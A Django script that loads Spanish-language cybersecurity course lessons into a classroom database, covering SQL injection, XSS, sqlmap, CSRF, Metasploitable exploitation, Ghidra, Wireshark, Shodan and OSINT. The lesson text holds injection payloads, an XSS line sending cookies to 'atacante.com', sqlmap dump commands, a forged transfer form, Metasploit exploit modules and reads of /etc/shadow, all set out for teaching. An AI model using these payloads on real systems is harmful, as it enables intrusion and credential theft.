from apps.classroom.models import Lesson

fixes = [
    ("SQL Injection: teoría y práctica",
     "https://www.youtube.com/watch?v=2OPVViV-GGk",
     "SQL Injection es la vulnerabilidad critica mas encontrada en aplicaciones web.\n\nTipos:\n- Union-based: extrae datos con UNION SELECT\n- Error-based: extrae datos de mensajes de error\n- Boolean blind: inferir true/false sin output\n- Time-based blind: usar SLEEP() para confirmar\n\nDeteccion:\n' OR '1'='1\n' OR 1=1--\n' UNION SELECT NULL,NULL--\n\nExtraccion:\n' UNION SELECT table_name,2 FROM information_schema.tables--\n' UNION SELECT username,password FROM users--\n\nPrevencion: prepared statements, ORM, WAF, minimo privilegio en BD."),

    ("Cross-Site Scripting (XSS) completo",
     "https://www.youtube.com/watch?v=L5l9lSnNMxg",
     "XSS permite inyectar JavaScript malicioso en paginas vistas por otros usuarios.\n\nTipos:\n- Reflected: payload en la URL\n- Stored: payload guardado en BD\n- DOM-based: manipulacion del DOM\n\nPayloads de deteccion:\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nRobo de cookies stored XSS:\n<script>new Image().src='https://atacante.com/?c='+document.cookie</script>\n\nPrevención: escape de output, Content Security Policy (CSP), HttpOnly cookies, validacion de input."),

    ("SQLMap: automatizando SQLi",
     "https://www.youtube.com/watch?v=nVj8MUKkzQk",
     "SQLMap automatiza la deteccion y explotacion de SQL Injection en aplicaciones web.\n\nComandos esenciales:\nsqlmap -u 'http://objetivo/page.php?id=1'\nsqlmap -u 'http://objetivo/?id=1' --dbs\nsqlmap -u 'http://objetivo/?id=1' -D midb --tables\nsqlmap -u 'http://objetivo/?id=1' -D midb -T users --dump\n\nFlags utiles:\n--batch          sin confirmaciones manuales\n--level 5        intensidad maxima de pruebas\n--risk 3         pruebas mas agresivas\n--tamper=space2comment  bypass de WAF\n--cookie='session=abc123'  con sesion autenticada\n--proxy=http://127.0.0.1:8080  pasar por Burp"),

    ("CSRF: ataques y defensas",
     "https://www.youtube.com/watch?v=vRBihr41JTo",
     "CSRF engana al navegador de una victima autenticada para realizar peticiones no deseadas.\n\nComo funciona:\n1. Victima esta autenticada en banco.com\n2. Victima visita malicious.com del atacante\n3. Formulario oculto hace POST al banco con sus cookies\n4. El banco ejecuta la operacion porque las cookies son validas\n\nEjemplo de ataque en HTML:\n<form action='https://banco.com/transfer' method='POST' id='f'>\n  <input name='to' value='atacante'>\n  <input name='amount' value='1000'>\n</form>\n<script>document.getElementById('f').submit()</script>\n\nDefensas:\n- CSRF tokens unicos por sesion en cada formulario\n- SameSite cookies: Strict o Lax\n- Verificar header Origin y Referer\n- Re-autenticacion para acciones criticas"),

    ("Identificación de strings y imports",
     "https://www.youtube.com/watch?v=oHXaRnBBfhI",
     "Las strings e imports son las pistas mas rapidas para entender capacidades de un malware.\n\nBusqueda de strings en Ghidra:\n- Window > Defined Strings\n- Filtrar por: URL, IP, registry keys, API names\n- Strings sospechosas: base64, rutas del sistema, comandos\n\nImports que delatan comportamiento malicioso:\n\nRed: WSAStartup, connect, send, recv, InternetOpen\nArchivos: CreateFile, WriteFile, DeleteFile\nRegistro: RegOpenKeyEx, RegSetValueEx\nProcesos: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread\nAnti-debug: IsDebuggerPresent, Sleep\n\nStrings ofuscadas: usar FLOSS de FireEye para extraer strings codificadas que las herramientas normales no ven."),

    ("Wireshark: captura y análisis de tráfico",
     "https://www.youtube.com/watch?v=lb1Dw0elw0Q",
     "Wireshark es el analizador de protocolos de red mas utilizado del mundo. Esencial para debugging, forense y pentesting.\n\nFiltros de display esenciales:\nhttp\ndns\narp\ntcp.port == 443\nip.addr == 192.168.1.1\nhttp.request.method == POST\n\nSeguir flujo TCP:\nBoton derecho en paquete > Follow > TCP Stream\n\nCaptura CLI con tshark:\ntshark -i eth0 -f 'port 80' -w captura.pcap\ntshark -r captura.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri\n\nAnalisis forense:\n- Exfiltracion de datos: DNS tunneling, HTTP POST grandes\n- Beaconing de C2: peticiones regulares cada X segundos\n- Port scans: muchos RST en poco tiempo"),

    ("Shodan: el buscador de hackers",
     "https://www.youtube.com/watch?v=5mOfVfSBMoo",
     "Shodan indexa dispositivos conectados a internet: routers, camaras, servidores, PLCs industriales.\n\nBusquedas utiles:\nhostname:ejemplo.com\norg:'Nombre Empresa' port:22\nproduct:'Apache httpd' version:'2.4.49'\ncountry:ES city:Madrid port:3389\nvuln:CVE-2021-44228\n\nShodan CLI:\npip install shodan\nshodan init TU_API_KEY\nshodan host 1.2.3.4\nshodan search 'apache 2.4.49' --fields ip_str,port,org\n\nMonitoriza tu empresa: crea alerts para tu IP o ASN y recibe notificaciones cuando Shodan detecte nuevos puertos abiertos en tu infraestructura."),

    ("Lab: Explotación de Metasploitable",
     "https://www.youtube.com/watch?v=svB-QmMCNHc",
     "Metasploitable es una maquina virtual Linux intencionalmente vulnerable para practicar en entorno seguro.\n\nVulnerabilidades clasicas:\n\n1. vsftpd 2.3.4 backdoor (puerto 21):\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS IP_METASPLOITABLE\nrun\n\n2. Samba usermap_script (puerto 445):\nuse exploit/multi/samba/usermap_script\nset PAYLOAD cmd/unix/interact\nrun\n\n3. Java RMI Server (puerto 1099):\nuse exploit/multi/misc/java_rmi_server\nrun\n\nTras obtener acceso practica:\n- Enumerar usuarios: cat /etc/passwd\n- Buscar SUID: find / -perm -4000 2>/dev/null\n- Escalar privilegios a root\n- Extraer hashes: cat /etc/shadow"),

    ("Decompilación y análisis de funciones",
     "https://www.youtube.com/watch?v=TLxKs7NrmrE",
     "El decompiler de Ghidra convierte ensamblador en pseudocodigo C para facilitar el analisis.\n\nTecnicas esenciales:\n\n1. Renombrar para claridad (tecla L):\nAntes: FUN_00401234(param_1, param_2)\nDespues: decrypt_config(encrypted_data, key)\n\n2. Retype de variables (tecla T):\nCambiar undefined4 por int, char*, HANDLE segun contexto\n\n3. Buscar patrones tipicos:\nLoop de cifrado XOR:\nfor (i = 0; i < length; i++) {\n    data[i] = data[i] ^ key[i % key_len];\n}\n\n4. Identificar capacidades por imports:\nSocket calls -> comunicacion C2\nRegistry calls -> persistencia\nVirtualAlloc + WriteProcessMemory -> inyeccion de codigo\nIsDebuggerPresent -> anti-analisis"),

    ("Práctica: OSINT de un objetivo real",
     "https://www.youtube.com/watch?v=q2WCbQQpjP8",
     "Aplicamos todas las tecnicas OSINT aprendidas sobre un objetivo de practica autorizado.\n\nMetodologia OSINT completa:\n1. Reconocimiento pasivo: Shodan, Censys, theHarvester\n2. Analisis DNS: whois, dig, subfinder, amass\n3. Analisis web: BuiltWith, Wappalyzer, Wayback Machine\n4. Redes sociales: LinkedIn, Twitter, GitHub\n5. Credenciales expuestas: HaveIBeenPwned, DeHashed\n\nPlantilla de informe OSINT:\n- Resumen ejecutivo\n- Informacion de dominio y DNS\n- Activos descubiertos: IPs, subdominios, tecnologias\n- Empleados identificados\n- Credenciales expuestas\n- Recomendaciones de mejora\n\nBonus: usar Maltego para visualizar las relaciones entre todos los datos encontrados."),
]

updated = 0
for title, video, content in fixes:
    n = Lesson.objects.filter(title=title).update(
        video_url=video, content_type="video", content=content
    )
    updated += n

total_with_video = Lesson.objects.exclude(video_url="").count()
print(f"Lecciones actualizadas: {updated}")
print(f"Total lecciones con video: {total_with_video} / {Lesson.objects.count()}")
